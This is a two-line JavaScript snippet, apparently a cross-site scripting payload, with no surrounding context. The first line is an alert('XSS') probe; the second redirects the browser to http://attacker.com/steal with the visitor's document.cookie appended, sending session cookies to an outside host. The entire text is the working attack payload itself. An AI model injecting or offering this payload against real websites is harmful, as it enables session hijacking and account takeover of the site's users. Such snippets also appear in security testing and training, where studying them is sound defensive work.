alert('XSS');
document.location='http://attacker.com/steal?cookie='+document.cookie;